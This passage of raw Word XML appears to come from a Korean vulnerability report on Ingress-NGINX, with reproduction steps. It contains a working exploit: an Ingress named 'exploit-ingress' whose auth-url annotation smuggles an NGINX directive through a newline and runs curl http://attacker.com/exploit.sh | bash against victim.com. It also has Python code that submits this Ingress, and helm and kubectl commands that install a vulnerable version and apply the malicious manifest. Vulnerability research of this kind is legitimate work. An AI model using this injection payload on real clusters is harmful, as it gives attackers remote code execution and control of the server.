                      </w:r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r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    "kind"</w:t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: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"Ingress"</w:t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>,</w:t>
                      </w:r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   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"metadata"</w:t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>: {</w:t>
                      </w:r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       </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"name"</w:t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: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"exploit-ingress"</w:t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>,</w:t>
                      </w:r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       </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"annotations"</w:t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>: {</w:t>
                      </w:r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           </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"nginx.ingress.kubernetes.io/auth-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"</w:t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: </w:t>
                      </w:r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r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve">                # </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>개행</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>문자</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>(\n)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>로</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> NGINX directive </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>분리</w:t>
                      </w:r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               </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>http://legit.com/;#\\n    exec /bin/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>sh</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -c 'curl</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>http://attacker.com/exploit.sh | bash</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>';\\n</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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       }</w:t>
                      </w:r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 </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/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 }</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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>,</w:t>
                      </w:r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   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"spec"</w:t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>: {</w:t>
                      </w:r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       </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"rules"</w:t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>: [{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"host"</w:t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: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"victim.com"</w:t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, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"http"</w:t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>: {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"paths"</w:t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>: [{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"path"</w:t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: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"/"</w:t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>}]}}]</w:t>
                      </w:r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   }</w:t>
                      </w:r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E1E097B" w14:textId="7FA83E0C" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr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w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="746155A2" wp14:editId="633D9D3D">
                <wp:extent cx="5324475" cy="1446028"/>
                <wp:effectExtent l="0" t="0" r="28575" b="20955"/>
                <wp:docPr id="608326474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1446028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2B1B5" w14:textId="6F071FFD" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>try</w:t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:</w:t>
                            </w:r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   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"># Ingress </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>생성</w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>시도</w:t>
                            </w:r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api.create</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/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_namespaced_ingress</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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(namespace=</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"default"</w:t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, body=body)</w:t>
                            </w:r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r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve">except </w:t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Exception as e:</w:t>
                            </w:r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   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="008E157E">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="7030A0"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>print</w:t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530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>f"Exploit</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> failed:</w:t>
                            </w:r>
                            <w:r w:rsidRPr="0071623C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{e}")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6155A2" id="_x0000_s1031" style="width:419.25pt;height:11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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="1E42B1B5" w14:textId="6F071FFD" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>try</w:t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>:</w:t>
                      </w:r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   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"># Ingress </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>생성</w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>시도</w:t>
                      </w:r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   </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/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>api.create</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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>_namespaced_ingress</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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>(namespace=</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"default"</w:t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>, body=body)</w:t>
                      </w:r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r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve">except </w:t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>Exception as e:</w:t>
                      </w:r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   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="008E157E">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="7030A0"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>print</w:t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>(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>f"Exploit</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> failed:</w:t>
                      </w:r>
                      <w:r w:rsidRPr="0071623C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{e}")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0F89597" w14:textId="3D5E1A26" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="001D6E9D" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">5.4 </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>재현</w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F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F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>절차</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E59595F" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>1. 테스트 환경 구성</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037E7ED6" w14:textId="45C18FBD" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2DB41DDA" wp14:editId="48DBFC77">
                <wp:extent cx="5324475" cy="1573618"/>
                <wp:effectExtent l="0" t="0" r="28575" b="26670"/>
                <wp:docPr id="47078242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1573618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494E3" w14:textId="4D2C1036" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                            <w:pPr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530133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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="44608455" w14:textId="048913C2" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                            <w:pP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</w:pPr>
                            <w:r w:rsidRPr="00530133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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"># </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>취약</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>버전</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> Ingress-NGINX </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133"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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>설치</w:t>
                            </w:r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r w:rsidRPr="00530133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helm install ingress-nginx ingress-nginx/ingress-nginx \</w:t>
                            </w:r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r w:rsidRPr="00530133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 --version </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133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.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>11</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00530133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.4 \</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="00530133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 -n ingress-nginx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B41DDA" id="_x0000_s1032" style="width:419.25pt;height:1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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="26D494E3" w14:textId="4D2C1036" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                      <w:pPr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</w:pPr>
                      <w:r w:rsidRPr="00530133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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="44608455" w14:textId="048913C2" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00530133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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"># </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>취약</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>버전</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> Ingress-NGINX </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133"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lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>설치</w:t>
                      </w:r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r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>helm install ingress-nginx ingress-nginx/ingress-nginx \</w:t>
                      </w:r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r w:rsidRPr="00530133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 --version </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>11</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00530133">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>.4 \</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="00530133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 -n ingress-nginx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4F6DE9C" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs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lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2. 악성 Ingess 배포</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AF0F67" w14:textId="08D0C7AB" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C88A39E" wp14:editId="00BB0C4C">
                <wp:extent cx="5324475" cy="701749"/>
                <wp:effectExtent l="0" t="0" r="28575" b="22225"/>
                <wp:docPr id="83871411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701749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ECC23" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                            <w:pPr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530133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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4D1A663B" w14:textId="18675F99" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                            <w:pPr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</w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00530133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kubectl</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00530133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 xml:space="preserve"> apply -f malicious-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidRPr="00530133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ingress.yaml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88A39E" id="_x0000_s1033" style="width:419.25pt;height:5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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7DEECC23" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                      <w:pPr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</w:pPr>
                      <w:r w:rsidRPr="00530133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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4D1A663B" w14:textId="18675F99" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                      <w:pPr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</w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00530133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kubectl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
